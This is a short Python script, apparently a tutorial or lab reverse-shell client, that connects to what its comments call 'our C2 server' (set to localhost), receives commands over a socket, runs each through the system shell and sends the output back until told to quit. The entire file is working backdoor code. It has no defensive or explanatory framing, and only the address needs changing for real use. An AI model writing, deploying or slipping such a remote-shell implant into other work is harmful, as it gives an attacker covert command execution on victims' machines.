#!/usr/bin/python3

import socket
import subprocess

HOST = '127.0.0.1' # ip of our C2 server
PORT = 5555 # random port it does not matter

# set up the socket and connect to the server
s = socket.socket()
s.connect((HOST, PORT))

# this loop will run until it receive 'quit'
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == 'quit':
        break
		
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0: # send 'ok' so the server knows everything is okay
        result = 'OK'.encode()

    s.send(result)

s.close()
